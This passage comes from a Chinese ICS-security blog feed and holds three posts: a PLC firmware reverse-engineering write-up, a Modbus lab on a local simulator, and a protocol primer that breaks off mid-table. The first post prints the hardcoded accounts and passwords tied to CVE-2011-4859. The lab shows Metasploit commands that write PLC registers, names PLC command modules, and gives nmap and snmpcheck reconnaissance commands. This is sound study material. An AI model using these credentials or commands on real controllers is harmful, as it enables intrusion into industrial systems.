tcpShowInit();  icmpLibInit(&amp;icmpCfgParams);  icmpShowInit();  igmpLibInit();  mCastRouteLibInit();  netLibInit();  tcpTraceInit();  netShowInit();  return;}</code></pre><p>在 <code>usrNetworkBoot</code> 中主要进行处理网络的地址、设备名：</p><pre><code class="cpp">void usrNetworkBoot(void){  usrNetBoot();  usrNetworkAddrInit();  usrNetmaskGet();  usrNetDevNameGet();  usrNetworkDevStart();  return;}</code></pre><p>接下来 <code>usrNetRemoteInit</code> 函数创建 remote 进程，设备连接至网络：</p><pre><code class="cpp">void usrNetRemoteInit(void){  usrNetHostSetup();  usrNetRemoteCreate();  return;}</code></pre><p>最后调用 <code>usrNetAppInit</code>，其中会包括 TFTP（一种以 UDP 为基础的文件传输协议）、SNMP（简单网络管理协议）等的初始化：</p><pre><code class="cpp">void usrNetAppInit(void){  usrSecurity();  tftpdInit(0,0,0,0,0);  sntpcInit(0x7b);  pingLibInit();  usrSnmpdInit();  return;}</code></pre><p>除了其他函数外，<code>usrSecurity</code> 函数中主要创建了一个用户登录的表，在最后调用的 <code>loginUserAdd</code> 中会先去表中找用户名，如果存在会报错，如果没有就会添加到表中。这里出现一个大问题就是用户名和密码都是明文存储，逆向得到的数据可以直接拿来登录：</p><pre><code class="cpp">void usrSecurity(void){  if ((sysFlags &amp; 0x20) == 0) {    loginInit();    shellLoginInstall(loginPrompt,0);    loginUserAdd(0,0);  }  return;}int loginUserAdd(undefined4 param_1,undefined4 param_2){  int iVar1;  uint uVar2;  undefined auStack24 [4];  byte local_14 [8];  iVar1 = symFindByName(DAT_0030c96c,param_1,auStack24,local_14);  if (iVar1 == 0) {    errnoSet(&amp;DAT_00360002);    iVar1 = -1;  }  else {    uVar2 = symAdd(DAT_0030c96c,param_1,param_2,(uint)local_14[0],(uint)symGroupDefault);    iVar1 = (int)(((int)uVar2 &gt;&gt; 0x1f) - ((int)uVar2 &gt;&gt; 0x1f ^ uVar2)) &gt;&gt; 0x1f;  }  return iVar1;}</code></pre><p>交叉引用一下，定位到多处调用。这个漏洞就是 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2011-4859" target="_blank" rel="noopener">CVE-2011-4859</a>（施耐德硬编码漏洞），攻击者可以获取到 FTP、TELNET 等协议的账号密码，并远程访问 PLC：</p><pre><code class="cpp">void usrAppInit(void){  ...  printf(s_-----&gt;_Password:_%s_&lt;-----_00205b30,auStack56);  loginDefaultEncrypt(auStack56,&amp;DAT_00342044);  loginUserAdd(s_fwupgrade_00205b4c,&amp;DAT_00342044);  loginUserAdd(s_sysdiag_00205b58,s_bbddRdzb9_00205b60);  loginUserAdd(s_fdrusers_00205b6c,s_bRbQyzcy9b_00205b78);  loginUserAdd(&amp;DAT_00205b84,s_cdcS9bcQc_00205b8c);  loginUserAdd(s_ntpupdate_00205b98,s_See9cb9y99_00205ba4);  ...}</code></pre><h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><h2 id="PowerPC-寄存器"><a href="#PowerPC-寄存器" class="headerlink" title="PowerPC 寄存器"></a>PowerPC 寄存器</h2><ul><li>r0：在 Function Prologs 时使用，一般不需要我们关心；</li><li>r1：栈寄存器；</li><li>r2：TOC 指针（Table of Contents），用于在系统调用时标识系统调用号；</li><li>r3：存储函数返回值；</li><li>r4-r10：参数，返回值较为特殊时（比如乘法导致一个寄存器放不下的时候），r4 也可以存放返回值；</li><li>r11：在指针的调用和当作一些语言的环境指针；</li><li>r12：在异常处理和 glink（动态连接器）代码；</li><li>r13：保留作为系统线程 ID；</li><li>r14-r31：存储本地变量。</li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.anquanke.com/post/id/187792" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187792</a><br><a href="https://bbs.pediy.com/thread-229574.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-229574.htm</a><br><a href="https://www.anquanke.com/post/id/188591" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188591</a><br><a href="https://www.anquanke.com/post/id/189164" target="_blank" rel="noopener">https://www.anquanke.com/post/id/189164</a><br><a href="https://www.anquanke.com/post/id/190565" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190565</a><br><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PLC 固件分析。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="ics" scheme="blog.b3ale.cn/tags/ics/"/>
    
  </entry>
  
  <entry>
    <title>Experiments of Modbus Protocol</title>
    <link href="blog.b3ale.cn/2020/07/04/Experiments-of-Modbus-Protocol/"/>
    <id>blog.b3ale.cn/2020/07/04/Experiments-of-Modbus-Protocol/</id>
    <published>2020-07-04T12:28:11.000Z</published>
    <updated>2020-07-05T07:25:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用工具模拟 Modbus 协议并抓包分析一些基础的功能码。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>Kali Rolling (2019.4) x64</li><li>ModbusPal.jar</li><li>mbtget</li><li>Metasploit Framework</li></ul><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>启动 ModbusPal.jar，添加至少一个 Modbus Slave 作为模拟的 PLC：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/1.png" srcset="/img/loading.gif" alt></p><p>为新建的 Modbus Slave 分别添加 coils（比特）和 holding registers（16 位无符号整型），并设置一些值：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/2.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/Experiments-of-Modbus-Protocol/3.png" srcset="/img/loading.gif" alt></p><p>下载并安装 mbtget 工具：</p><pre><code class="bash">$ git clone https://github.com/sourceperl/mbtget.git &amp; cd mbtget$ perl Makefile.PL$ make$ make install</code></pre><h1 id="Operate-with-Function-Code"><a href="#Operate-with-Function-Code" class="headerlink" title="Operate with Function Code"></a>Operate with Function Code</h1><p>使用 <code>mbtget -h</code> 查看命令行参数，其中只需要关注用于读写数据的几个参数：</p><pre><code class="bash">root@kali:~# mbtget -husage : mbtget [-hvdsf] [-2c]               [-u unit_id] [-a address] [-n number_value]               [-r[12347]] [-w5 bit_value] [-w6 word_value]               [-p port] [-t timeout] serveurcommand line :  -h                    : show this help message  -v                    : show version  -d                    : set dump mode (show tx/rx frame in hex)  -s                    : set script mode (csv on stdout)  -r1                   : read bit(s) (function 1)  -r2                   : read bit(s) (function 2)  -r3                   : read word(s) (function 3)  -r4                   : read word(s) (function 4)  -w5 bit_value         : write a bit (function 5)  -w6 word_value        : write a word (function 6)  -f                    : set floating point value  -2c                   : set &quot;two&#39;s complement&quot; mode for register read  -hex                  : show value in hex (default is decimal)  -u unit_id            : set the modbus &quot;unit id&quot;  -p port_number        : set TCP port (default 502)  -a modbus_address     : set modbus address (default 0)  -n value_number       : number of values to read  -t timeout            : set timeout seconds (default is 5s)</code></pre><p>首先对 coils 进行读取，<code>-a</code> 表示地址，<code>-n</code> 表示读取的数量：</p><pre><code class="bash">root@kali:~# mbtget -r1 -a 0 -n 10 127.0.0.1values:  1 (ad 00000):     1  2 (ad 00001):     1  3 (ad 00002):     1  4 (ad 00003):     1  5 (ad 00004):     0  6 (ad 00005):     0  7 (ad 00006):     0  8 (ad 00007):     0  9 (ad 00008):     0 10 (ad 00009):     0</code></pre><p>在 Wireshark 中抓包并筛选，前后分别为 TCP 三次握手和四次挥手。中间两条 Modbus 协议即为我们进行的操作，首先是发出进行读取的请求，Function Code 是 Read Coils，Bit Count 为 10，即读取 10 个比特：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/4.png" srcset="/img/loading.gif" alt></p><p>Response 中返回的数据即为前 10 个比特的值：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/5.png" srcset="/img/loading.gif" alt></p><p>接下来对 holding registers 进行读取：</p><pre><code class="bash">root@kali:~# mbtget -r3 -a 0 -n 10 127.0.0.1values:  1 (ad 00000):     0  2 (ad 00001):     0  3 (ad 00002):     0  4 (ad 00003):     1  5 (ad 00004):     2  6 (ad 00005):     3  7 (ad 00006):     4  8 (ad 00007):     5  9 (ad 00008):     0 10 (ad 00009):     0</code></pre><p>和前面类似，Function Code 是 Read Holding Registers，Word Count 为 10，即读取 10 个字：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/6.png" srcset="/img/loading.gif" alt></p><p>Response 中返回前十个 holding registers 中的内容：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/7.png" srcset="/img/loading.gif" alt></p><p>然后对写 coil 操作进行设置：</p><pre><code class="bash">root@kali:~# mbtget -w5 1 -a 2 127.0.0.1bit write ok</code></pre><p>抓包看到的 Function Code 为 Write Single Coil，Reference Number 为 2（即第 3 个位置），Data 为 0：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/8.png" srcset="/img/loading.gif" alt></p><p>Response 包中返回修改后对应位置的值：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/9.png" srcset="/img/loading.gif" alt></p><p>写 holding register 的操作类似：</p><pre><code class="bash">root@kali:~# mbtget -w6 233 -a 5 127.0.0.1word write ok</code></pre><p>抓包得到 Function Code 为 Write Single Register，Reference Number 为 5，Data 为 0xe9（233）：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/10.png" srcset="/img/loading.gif" alt></p><p>Response 返回修改后的结果：</p><p><img src="/pics/Experiments-of-Modbus-Protocol/11.png" srcset="/img/loading.gif" alt></p><p>使用 MSF 同样可以进行类似的操作，如读寄存器内容：</p><pre><code class="bash">msf5 &gt; use auxiliary/scanner/scada/modbusclientmsf5 auxiliary(scanner/scada/modbusclient) &gt; set ACTION READ_HOLDING_REGISTERSACTION =&gt; READ_HOLDING_REGISTERSmsf5 auxiliary(scanner/scada/modbusclient) &gt; set RHOST 127.0.0.1RHOST =&gt; 127.0.0.1msf5 auxiliary(scanner/scada/modbusclient) &gt; set DATA_ADDRESS 5DATA_ADDRESS =&gt; 5msf5 auxiliary(scanner/scada/modbusclient) &gt; run[*] Running module against 127.0.0.1[*] 127.0.0.1:502 - Sending READ HOLDING REGISTERS...[+] 127.0.0.1:502 - 1 register values from address 5 :[+] 127.0.0.1:502 - [3][*] Auxiliary module execution completed</code></pre><p>写寄存器内容：</p><pre><code class="bash">msf5 &gt; use auxiliary/scanner/scada/modbusclientmsf5 auxiliary(scanner/scada/modbusclient) &gt; set ACTION WRITE_REGISTERACTION =&gt; WRITE_REGISTERmsf5 auxiliary(scanner/scada/modbusclient) &gt; set RHOST 127.0.0.1RHOST =&gt; 127.0.0.1msf5 auxiliary(scanner/scada/modbusclient) &gt; set DATA 123DATA =&gt; 123msf5 auxiliary(scanner/scada/modbusclient) &gt; set DATA_ADDRESS 6DATA_ADDRESS =&gt; 6msf5 auxiliary(scanner/scada/modbusclient) &gt; run[*] Running module against 127.0.0.1[*] 127.0.0.1:502 - Sending WRITE REGISTER...[+] 127.0.0.1:502 - Value 123 successfully written at registry address 6[*] Auxiliary module execution completed</code></pre><p>抓包的结果和 mbtget 相同。</p><h1 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h1><p>MSF 中还有一些模块可以用来执行 PLC 命令：</p><pre><code class="bash">msf5 &gt; use auxiliary/scanner/scada/modicon_command...msf5 &gt; use auxiliary/admin/scada/modicon_stux_transfer_ASO</code></pre><p>使用 nmap 探测 PLC 开启的端口：</p><pre><code class="bash">nmap -n -T4 -p- -scan-delay=1 [TARGET]</code></pre><p>使用 snmpcheck 可以获取指定 PLC 的相关指纹信息：</p><pre><code class="bash">snmpcheck -t [TARGET]</code></pre><h1 id="Joke"><a href="#Joke" class="headerlink" title="Joke"></a>Joke</h1><p>工控安全很难做好是因为原本设备的使用期限就很长（十年甚至二十年以上），本身维护的开销又很大，一个漏洞的修复很难落实到每一点上。然而真正要做到安全，则需要从管理、设备、操作人员等多个方面协作才能实现。</p><p><img src="/pics/Experiments-of-Modbus-Protocol/12.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=iGwm6-lyn2Y" target="_blank" rel="noopener">https://www.youtube.com/watch?v=iGwm6-lyn2Y</a><br><a href="https://www.youtube.com/watch?v=rP_Jys1_OJk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=rP_Jys1_OJk</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用工具模拟 Modbus 协议并抓包分析一些基础的功能码。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ics" scheme="blog.b3ale.cn/tags/ics/"/>
    
  </entry>
  
  <entry>
    <title>工控安全基础概念初探</title>
    <link href="blog.b3ale.cn/2020/06/24/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%88%9D%E6%8E%A2/"/>
    <id>blog.b3ale.cn/2020/06/24/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%88%9D%E6%8E%A2/</id>
    <published>2020-06-24T12:33:37.000Z</published>
    <updated>2020-07-06T13:32:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>初探工控安全，主要分为协议安全、网络安全和固件安全等。</p><a id="more"></a><h1 id="Terminologies"><a href="#Terminologies" class="headerlink" title="Terminologies"></a>Terminologies</h1><ul><li>SCADA（Supervisory Control And Data Acquisition）：数据采集与监视控制系统</li><li>ICS（Industrial Control System）：工业控制系统</li><li>DCS（Distributed Control System）：分布式（集散）控制系统</li><li>PCS（Process Control System）：过程控制系统</li><li>ESD（Emergency Shutdown Device）：紧急停车系统</li><li>PLC（Programmable Logic Controller）：可编程序控制器<ul><li>工业场景需要控制许多的机械设备，而大部分机械设备需要用电路信号直接控制，比如许许多多的开关，对应到电上就是电路的通断。所以需要一些可以满足这种应用场景的专用计算机，并且还需要低时延，稳定性高，防震防潮等，即 PLC</li><li>使用一种叫”梯形图”的语言编写控制输入输出逻辑的程序（实现通过梯形图控制硬件 IO）</li></ul></li><li>RTU（Remote Terminal Unit）：远程终端控制系统</li><li>IED（Intelligent Electronic Device）：智能检测单元</li><li>HMI（Human Machine Interface）：人机界面</li><li>MIS（Management Information System）：管理信息系统</li><li>SIS（Supervisory Information System）：生产过程自动化监控和管理系统</li><li>MES（Manufacturing Execution System）：制造执行管理系统</li></ul><h1 id="ICS-Structure"><a href="#ICS-Structure" class="headerlink" title="ICS Structure"></a>ICS Structure</h1><p>工业控制系统结构：</p><ol><li>传感器和执行器；</li><li>可编程控制器（PLC）；</li><li>工业网络及现场总线；</li><li>工业计算机及工业组态软件。</li></ol><p><img src="/pics/工控安全基础概念初探/1.png" srcset="/img/loading.gif" alt></p><ul><li>过程自动化控制系统<ul><li>应用在流程行业，比如：石油、化工、医药、冶金、水处理等</li><li>对应的控制系统：DCS 居多，大型 PLC 为主，单台控制器 IO 点数多数在 2000 点以上，全冗余架构</li></ul></li><li>工厂自动化控制系统<ul><li>应用在离散行业，比如：汽车、港口、烟草等</li><li>对应的控制系统：主要以 PLC 为主，采用和设备捆绑为主，单台控制 IO 点数少于 2000 点，单机为主</li></ul></li></ul><h2 id="常见工业控制系统架构"><a href="#常见工业控制系统架构" class="headerlink" title="常见工业控制系统架构"></a>常见工业控制系统架构</h2><ol><li>Enterprise Zone：包括数据库、服务器等一些基础设备；</li><li>ICS DMZ：和一般网络架构中的 DMZ 类似，通常用于给外网提供服务，同时保护内网；</li><li>Process Control Zone：相当于内网的部分，通常外部对其的访问权限为只读；</li></ol><p>工业控制系统整体分层：</p><ol><li>Upper Layer（Engineering Workstation）：包括 HMI、SCADA 等设备。</li><li>Middle Layer：包括 PLC 等设备；</li><li>Lower Layer：包括传感器等设备。</li></ol><h2 id="工控产品厂商和产品介绍"><a href="#工控产品厂商和产品介绍" class="headerlink" title="工控产品厂商和产品介绍"></a>工控产品厂商和产品介绍</h2><ul><li>Siemens<ul><li>控制系统家族<ul><li>S7-1500 控制系统</li><li>S7-1200 控制系统</li><li>S7-300/400 控制系统</li><li>S7-WINAC 控制系统</li></ul></li><li>组态软件家族<ul><li>TIA 博图/Step7</li><li>WINCC 组态监控软件</li><li>PLCSIM 模拟仿真软件</li></ul></li><li>通讯协议及端口<ul><li>S7 Comm 协议（私有协议）</li><li>通讯端口 102</li></ul></li></ul></li><li>Rockwell Automation<ul><li>控制系统家族<ul><li>Controllogix 控制系统</li><li>Compactlogix 控制系统</li><li>MicroLogix 控制系统</li><li>Softlogix 控制系统</li></ul></li><li>组态软件家族<ul><li>Studio5000/RSLogix 5000 组态软件</li><li>FactoryTalk View SE 组态监控软件</li><li>Emulation 模拟仿真软件</li></ul></li><li>通讯协议及端口</li><li>Ethernet/IP（公开协议）</li><li>通讯端口 44818/2222</li></ul></li></ul><h1 id="Protocols"><a href="#Protocols" class="headerlink" title="Protocols"></a>Protocols</h1><p>安全问题：</p><ul><li>缺乏身份认证：仅需要使用一个合法的 Modbus 地址和合法的功能码即可以建立一个 Modbus 会话；</li><li>缺乏授权机制：没有基于角色的访问控制机制，任意用户可以执行任意的功能；</li><li>缺乏加密保护：地址和命令明文传输，可以很容易地捕获和解析。</li></ul><h2 id="Modbus"><a href="#Modbus" class="headerlink" title="Modbus"></a><a href="https://www.anquanke.com/post/id/185513" target="_blank" rel="noopener">Modbus</a></h2><p>Modbus 是一种应用层的报文传输协议，它既可以在物理层面上选择串口进行简单的串行通信，也可以使用 TCP 的方式进行传输。Modbus 协议定义了一个与基础通信层无关的简单协议数据单元（PDU）。特定总线或网络上的 Modbus 协议映射能够在应用数据单元（ADU）上引入一些附加域。</p><blockquote><p>因为 Modbus 是应用层的协议，所以其安全漏洞并不只是它本身，TCP/IP 的漏洞也可以利用在 Modbus 上。</p></blockquote><p><img src="/pics/工控安全基础概念初探/2.png" srcset="/img/loading.gif" alt></p><p>Modbus 对应的协议栈：</p><table><thead><tr><th style="text-align:center">Layer</th><th style="text-align:center">ISO/OSI Model</th><th style="text-align:center">Protocol</th></tr></thead><tbody><tr><td style="text-align:center">7</td><td style="text-align:center">Application</td><td style="text-align:center">MODBUS Application Protocol</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">Presentation</td><td style="text-align:center">Empty</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">Session</td><td style="text-align:center">Empty</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Transport</td><td style="text-align:center">Empty</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Network</td><td style="text-align:center">Empty</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Data Link</td><td style="text-align:center">MODBUS Serial Line Protocol</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">Physical</td><td style="text-align:center">EIA/TIA-485 (or EIA/TIA-232)</td></tr></tbody></table><p><a href="https://youtu.be/iGwm6-lyn2Y?list=PLtGg6WbXti_8nwdf8ZsO_-n4Ik2cVnFJN&amp;t=2569" target="_blank" rel="noopener">Modbus 功能码（部分）</a>：</p><table><thead><tr><th style="text-align:center">Function code</th><th style="text-align:center">Function name</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Read coils</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Read holding registers</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">Write single coil</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">Write single register</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center">Write multiple registers</td></tr><tr><td style="text-align:center">23</td><td style="text-align:center">Read/Write multiple registers</td></tr></tbody></table><h2 id="PROFIBUS"><a href="#PROFIBUS" class="headerlink" title="PROFIBUS"></a>PROFIBUS</h2><p>一种用于工厂自动化车间级监控和现场设备层数据通信与控制的现场总线技术，可实现现场设备层到车间级监控的分散式数字控制和现场通信网络。</p><h2 id="DNP3"><a href="#DNP3" class="headerlink" title="DNP3"></a><a href="https://www.anquanke.com/post/id/187221" target="_blank" rel="noopener">DNP3</a></h2><ul><li>DNP（Distributed Network Protocol，分布式网络协议）是一种应用于自动化组件之间的通讯协议，常见于电力、水处理等行业；</li><li>简化 OSI 模型，完全基于 TCP/IP，只包含了物理层、数据层与应用层的体系结构（EPA），在应用层实现了对传输数据的分片、校验、控制等诸多功能；</li><li>DNP 借助 TCP 在以太网上运行，使用的端口是 20000 端口；</li><li>SCADA 可以使用 DNP 协议与主站、RTU、及 IED 进行通讯。</li></ul><h2 id="ICCP"><a href="#ICCP" class="headerlink" title="ICCP"></a>ICCP</h2><p>电力控制中心通讯协议。</p><h2 id="OPC"><a href="#OPC" class="headerlink" title="OPC"></a>OPC</h2><p>过程控制的 OLE（OLE for Process Control）。OPC 包括一整套接口、属性和方法的标准集，用于过程控制和制造业自动化系统。</p><h2 id="BACnet"><a href="#BACnet" class="headerlink" title="BACnet"></a>BACnet</h2><p>楼宇自动控制网络数据通讯协议（A Data Communication Protocol for Building Automation and Control Networks）。BACnet 协议是为计算机控制采暖、制冷、空调 HVAC 系统和其他建筑物设备系统定义服务和协议。</p><h2 id="CIP"><a href="#CIP" class="headerlink" title="CIP"></a>CIP</h2><p>通用工业协议，被 DeviceNet、ControlNet、EtherNet/IP 三种网络所采用。</p><h2 id="S7comm（Siemens-S7）"><a href="#S7comm（Siemens-S7）" class="headerlink" title="S7comm（Siemens S7）"></a><a href="https://www.anquanke.com/post/id/186099" target="_blank" rel="noopener">S7comm（Siemens S7）</a></h2><p>S7comm 全称 S7 Communication，是西门子专有协议，在西门子 S7-300/400 系列的 PLC 之间运行，用于 PLC 编程，PLC 之间的数据交换。S7 协议被封装在 TPKT 和 ISO-COTP 协议中。通过 TSAP，可加载 MPI、DP、以太网等不同物理结构总线或网络上，PLC 一般可以通过封装好的通讯功能快实现。</p><p>S7comm 对应的协议栈：</p><table><thead><tr><th style="text-align:center">Layer</th><th style="text-align:center">ISO/OSI Model</th><th style="text-align:center">Protocol</th></tr></thead><tbody><tr><td style="text-align:center">7</td><td style="text-align:center">Application</td><td style="text-align:center">S7 communication</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">Presentation</td><td style="text-align:center">S7 communication (COTP)</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">Session</td><td style="text-align:center">S7 communication (TPKT)</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Transport</td><td style="text-align:center">ISO-on-TCP (RFC 1006)</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Network</td><td style="text-align:center">IP</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Data Link</td><td style="text-align:center">Ethernet</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">Physical</td><td style="text-align:center">Ethernet</td></tr></tbody></table><p><img src="/pics/工控安全基础概念初探/3.png" srcset="/img/loading.gif" alt></p><p>应用层 S7comm 协议结构体包含三部分：</p><ul><li>Header</li><li>Parameter</li><li>Data</li></ul><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Protocol Id</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">ROSCTR</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Redundancy Identification (Reserved)</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Protocol Data Unit Reference</td><td style="text-align:center">4</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Parameter length</td><td style="text-align:center">6</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Data length</td><td style="text-align:center">8</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Error class</td><td style="text-align:center">10</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Error code</td><td style="text-align:center">12</td><td style="text-align:center">2</td></tr></tbody></table><ul><li>Protocol Id：协议 ID，通常为 0x32；</li><li>ROSCTR：PDU 的类型；<ul><li>0x01（JOB）：作业请求，如读/写存储器，读/写块，启动/停止设备，设置通信；</li><li>0x02（ACK）：确认响应，是没有数据的简单确认；</li><li>0x03（ACK_DATA）：确认数据响应，一般是相应 JOB 的请求；</li><li>0x07（USERDATA）：扩展协议，其参数字段包括请求/相应 ID，一般用于编程/调试、读取 SZL 等。</li></ul></li><li>Redundancy Identification：冗余数据，通常为 0x0000；</li><li>Protocol Data Unit Reference：协议数据单元参考，通过请求时间增加；</li><li>Parameter length：参数的总长度；</li><li>Data length：数据长度，如果读取 PLC 内部数据则为 0x0000；而对于其他功能则为 Data 部分的数据长度；</li><li>Error class：错误类型；<ul><li>0x00（No error）：没有错误；</li><li>0x81（Application relationship）：应用关系；</li><li>0x82（Object definition）：对象定义；</li><li>0x83（No resources available）：没有可用资源；</li><li>0x84（Error on service processing）：服务处理种错误；</li><li>0x85（Error on supplies）：请求错误；</li><li>0x87（Access error）：访问错误。</li></ul></li><li><a href="#错误码的含义">Error code：错误码</a></li></ul><h3 id="Parameter-amp-Data"><a href="#Parameter-amp-Data" class="headerlink" title="Parameter &amp; Data"></a>Parameter &amp; Data</h3><p>S7comm 协议的 Parameter 部分与 Data 部分，则是根据 Header 中 PDU type 的功能码的不同、协议扩展（Userdata）的内容不同而变得不同。当 PDU 类型是 JOB 和 ACK_DATA 时，常见的功能码如下：</p><ul><li>0x00（CPU services）：CPU 服务</li><li>0xf0（Setup communication）：建立通信<ul><li>在每个会话开始时被发送，然后才可以交换任何其他消息，主要用于协商 ACK 队列的大小和最大 PDU 长度，双方声明它们的支持值（和计算机网络中的最大传送长度声明类似），ACK 队列的长度决定了可以同时启动而不需要确认的并行作业的数量。PDU 和队列长度字段都是大端。</li></ul></li></ul><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Reserved（保留字节，一般为 0x00）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Max AmQ (parallel jobs with ack) calling</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Max AmQ (parallel jobs with ack) called</td><td style="text-align:center">4</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">PDU length</td><td style="text-align:center">6</td><td style="text-align:center">2</td></tr></tbody></table><ul><li>0x04（Read Var）：读取值<ul><li>读数据操作，通过指定变量的存储区域，地址（偏移量）及其大小或类型来执行。</li></ul></li></ul><p>当 PDU 类型是 JOB 时，Parameter 部分的结构如下（没有 Data 部分）：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Item count</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center"><code>Item [n]</code></td><td style="text-align:center">2+12n</td><td style="text-align:center">12</td></tr></tbody></table><p>其中一个 Item 的结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Variable specification（结构标识，通常为 0x12，代表变量规范）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length of following address specification（地址规范长度，主要是以此往后的地址长度）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#Item-结构中-Syntax-Id-取值">Syntax Id</a>（IDS 的地址规范的格式类型，用于确定寻址模式和其余项目结构的格式）</td><td style="text-align:center">2</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#Item-结构中-Transport-size-取值">Transport size</a>（数据传输大小，常见值如下表）</td><td style="text-align:center">3</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length（数据的长度）</td><td style="text-align:center">4</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">DB number（DB 编号，如果访问的不是 DB 区域，此处为 0x0000）</td><td style="text-align:center">6</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center"><a href="#Item-结构中-Area-取值">Area</a>（区域）</td><td style="text-align:center">8</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Address（地址）</td><td style="text-align:center">9</td><td style="text-align:center">3</td></tr></tbody></table><p>当 PDU 类型是 ACK_DATA 时，Parameter 部分的结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Item count</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr></tbody></table><p>Data 部分存储 Item 结构体，其中一个 Item 的结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center"><a href="#Item-结构中-Return-code-取值">Return code</a>（返回码）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#Item-结构中-Transport-size-取值">Transport size</a>（数据传输大小）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length（数据的长度）</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Data</td><td style="text-align:center">4</td><td style="text-align:center">4 + Length of 